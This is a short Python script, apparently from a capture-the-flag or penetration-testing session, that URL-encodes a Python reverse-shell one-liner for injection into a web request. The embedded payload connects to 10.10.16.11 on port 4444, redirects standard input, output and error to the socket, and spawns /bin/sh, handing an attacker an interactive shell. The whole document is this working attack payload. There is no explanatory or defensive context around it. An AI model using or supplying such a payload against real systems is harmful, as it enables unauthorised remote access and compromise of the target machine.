import urllib.parse

# Original string to be URL-encoded
original_string = 'export RHOST="10.10.16.11"; export RPORT=4444; python -c \'import socket,os,pty;s=socket.socket();s.connect(("10.10.16.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''

# URL-encode the string
encoded_string = urllib.parse.quote(original_string)

# Print the encoded string
print(encoded_string)